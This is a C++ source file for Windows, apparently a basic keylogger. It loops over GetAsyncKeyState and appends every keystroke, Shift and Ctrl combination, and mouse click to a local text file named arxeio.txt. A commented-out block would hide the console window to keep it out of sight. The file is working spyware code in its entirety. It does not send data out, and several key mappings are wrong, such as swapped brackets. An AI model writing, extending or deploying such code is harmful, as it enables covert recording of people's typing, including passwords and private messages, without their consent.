#include <iostream>
#include <windows.h>
#include <fstream>
#include <conio.h>
#include <wtypes.h>

using namespace std;

int main() {
	fstream arxeio;
	arxeio.open("arxeio.txt", fstream::app);

	/*HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
	*/
	while (true) {
		if (GetAsyncKeyState(0x01) == -32767) {
			arxeio << " \"LCLICK\" ";
		} else if (GetAsyncKeyState(0x02) == -32767) {
			arxeio << " \"RCLICK\" ";
		} else if (GetAsyncKeyState(0x04) == -32767) {
			arxeio << " \"MCLICK\" ";
		} else if (GetAsyncKeyState(0x05) == -32767) {
			arxeio << " \"X1MOUSE\" ";
		} else if (GetAsyncKeyState(0x06) == -32767) {
			arxeio << " \"X2MOUSE\" ";
		} else if (GetAsyncKeyState(0x08) == -32767) {
			long pos = arxeio.tellp(); // gets the current position of the buffer ( in this case 19)
			arxeio.seekp(pos - 1);
			arxeio.write("", 1);
		} else if (GetAsyncKeyState(0x09) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + TAB\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + TAB\" ";
			} else {
				arxeio << " \"TAB\" ";
			}
		} else if (GetAsyncKeyState(0x0D) == -32767) {
			arxeio << " \"ENTER\" ";
		} else if (GetAsyncKeyState(0x12) == -32767) {
			arxeio << " \"ALT\" ";
		} else if (GetAsyncKeyState(0x12) && GetAsyncKeyState(0x10) == -32767) {
			arxeio << " \"ALT + SHIFT\" ";
		} else if (GetAsyncKeyState(0x13) == -32767) {
			arxeio << " \"PAUSE\" ";
		} else if (GetAsyncKeyState(0x14) == -32767) {
			arxeio << " \"CAPS LOCK\" ";
		} else if (GetAsyncKeyState(0x20) == -32767) {
			arxeio << " ";
		} else if (GetAsyncKeyState(0x2E) == -32767) {
			arxeio << " \"DEL\" ";
		} else if (GetAsyncKeyState(0x24) == -32767) {
			arxeio << " \"HOME\" ";
		} else if (GetAsyncKeyState(0x25) == -32767) {
			arxeio << " \"LEFT-ARROW\" ";
		} else if (GetAsyncKeyState(0x26) == -32767) {
			arxeio << " \"UP-ARROW\" ";
		} else if (GetAsyncKeyState(0x27) == -32767) {
			arxeio << " \"RIGHT-ARROW\" ";
		} else if (GetAsyncKeyState(0x28) == -32767) {
			arxeio << " \"DOWN-ARROW\" ";
		} else if (GetAsyncKeyState(0x29) == -32767) {
			arxeio << " \"SELECT\" ";
		} else if (GetAsyncKeyState(0x30) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << ")";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 0\" ";
			} else {
				arxeio << "0";
			}
		} else if (GetAsyncKeyState(0x31) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "!";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 1\" ";
			} else {
				arxeio << "1";
			}
		} else if (GetAsyncKeyState(0x32) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "@";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 2\" ";
			} else {
				arxeio << "2";
			}
		} else if (GetAsyncKeyState(0x33) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "#";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 3\" ";
			} else {
				arxeio << "3";
			}
		} else if (GetAsyncKeyState(0x34) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "$";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 4\" ";
			} else {
				arxeio << "4";
			}
		} else if (GetAsyncKeyState(0x35) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "%";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 5\" ";
			} else {
				arxeio << "5";
			}
		} else if (GetAsyncKeyState(0x36) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "^";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 6\" ";
			} else {
				arxeio << "6";
			}
		} else if (GetAsyncKeyState(0x37) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "&";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 7\" ";
			} else {
				arxeio << "7";
			}
		} else if (GetAsyncKeyState(0x38) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "*";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 8\" ";
			} else {
				arxeio << "8";
			}
		} else if (GetAsyncKeyState(0x39) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "(";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + 9\" ";
			} else {
				arxeio << "9";
			}
		} else if (GetAsyncKeyState(0x40) == -32767) {
			arxeio << " \"UNDEFINED\" ";
		} else if (GetAsyncKeyState(0x41) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + A\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + A\" ";
			} else {
				arxeio << "A";
			}
		} else if (GetAsyncKeyState(0x42) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + B\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + B\" ";
			} else {
				arxeio << "B";
			}
		} else if (GetAsyncKeyState(0x43) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + C\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + C\" ";
			} else {
				arxeio << "C";
			}
		} else if (GetAsyncKeyState(0x44) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + D\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + D\" ";
			} else {
				arxeio << "D";
			}
		} else if (GetAsyncKeyState(0x45) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + E\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + E\" ";
			} else {
				arxeio << "E";
			}
		} else if (GetAsyncKeyState(0x46) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + F\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + F\" ";
			} else {
				arxeio << "F";
			}
		} else if (GetAsyncKeyState(0x47) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + G\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + G\" ";
			} else {
				arxeio << "G";
			}
		} else if (GetAsyncKeyState(0x48) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + H\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + H\" ";
			} else {
				arxeio << "H";
			}
		} else if (GetAsyncKeyState(0x49) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + I\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + I\" ";
			} else {
				arxeio << "I";
			}
		} else if (GetAsyncKeyState(0x4A) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + J\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + J\" ";
			} else {
				arxeio << "J";
			}
		} else if (GetAsyncKeyState(0x4B) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + K\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + K\" ";
			} else {
				arxeio << "K";
			}
		} else if (GetAsyncKeyState(0x4C) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + L\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + L\" ";
			} else {
				arxeio << "L";
			}
		} else if (GetAsyncKeyState(0x4D) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + M\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + M\" ";
			} else {
				arxeio << "M";
			}
		} else if (GetAsyncKeyState(0x4E) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + N\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + N\" ";
			} else {
				arxeio << "N";
			}
		} else if (GetAsyncKeyState(0x4F) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + O\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + O\" ";
			} else {
				arxeio << "O";
			}
		} else if (GetAsyncKeyState(0x50) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + P\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + P\" ";
			} else {
				arxeio << "P";
			}
		} else if (GetAsyncKeyState(0x51) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + Q\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + Q\" ";
			} else {
				arxeio << "Q";
			}
		} else if (GetAsyncKeyState(0x52) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + R\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + R\" ";
			} else {
				arxeio << "R";
			}
		} else if (GetAsyncKeyState(0x53) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + S\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + S\" ";
			} else {
				arxeio << "S";
			}
		} else if (GetAsyncKeyState(0x54) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT +T \" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + T\" ";
			} else {
				arxeio << "T";
			}
		} else if (GetAsyncKeyState(0x55) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + U\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + U\" ";
			} else {
				arxeio << "U";
			}
		} else if (GetAsyncKeyState(0x56) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + V\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + V\" ";
			} else {
				arxeio << "V";
			}
		} else if (GetAsyncKeyState(0x57) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + W\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + W\" ";
			} else {
				arxeio << "W";
			}
		} else if (GetAsyncKeyState(0x58) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + X\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + X\" ";
			} else {
				arxeio << "X";
			}
		} else if (GetAsyncKeyState(0x59) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + Y\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + Y\" ";
			} else {
				arxeio << "Y";
			}
		} else if (GetAsyncKeyState(0x5A) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << " \"SHIFT + Z\" ";
			} else if (GetAsyncKeyState(0x11)) {
				arxeio << " \"CTRL + Z\" ";
			} else {
				arxeio << "Z";
			}
		} else if (GetAsyncKeyState(0x60) == -32767) {
			arxeio << "0";
		} else if (GetAsyncKeyState(0x61) == -32767) {
			arxeio << "1";
		} else if (GetAsyncKeyState(0x62) == -32767) {
			arxeio << "2";
		} else if (GetAsyncKeyState(0x63) == -32767) {
			arxeio << "3";
		} else if (GetAsyncKeyState(0x64) == -32767) {
			arxeio << "4";
		} else if (GetAsyncKeyState(0x65) == -32767) {
			arxeio << "5";
		} else if (GetAsyncKeyState(0x66) == -32767) {
			arxeio << "6";
		} else if (GetAsyncKeyState(0x67) == -32767) {
			arxeio << "7";
		} else if (GetAsyncKeyState(0x68) == -32767) {
			arxeio << "8";
		} else if (GetAsyncKeyState(0x69) == -32767) {
			arxeio << "9";
		} else if (GetAsyncKeyState(0xBB) == -32767) {
			arxeio << "+";
		} else if (GetAsyncKeyState(0x6C) == -32767) {
			arxeio << "|";
		} else if (GetAsyncKeyState(0xBD) == -32767) {
			arxeio << "-";
		} else if (GetAsyncKeyState(0xBC) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "<";
			} else {
				arxeio << ",";
			}
		} else if (GetAsyncKeyState(0xBE) == -32767) {
			arxeio << ".";
		} else if (GetAsyncKeyState(0xC0) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "~";
			} else {
				arxeio << "`";
			}
		} else if (GetAsyncKeyState(0xBF) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "?";
			} else {
				arxeio << "/";
			}
		} else if (GetAsyncKeyState(0xDB) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "{";
			} else {
				arxeio << "/[";
			}
		} else if (GetAsyncKeyState(0xDD) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "]";
			} else {
				arxeio << "}";
			}
		} else if (GetAsyncKeyState(0xDC) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "|";
			} else {
				arxeio << "\\";
			}
		} else if (GetAsyncKeyState(0xDE) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << "\"";
			} else {
				arxeio << "'";
			}
		} else if (GetAsyncKeyState(0xBA) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				arxeio << ":";
			} else {
				arxeio << ";";
			}
		}
	}
}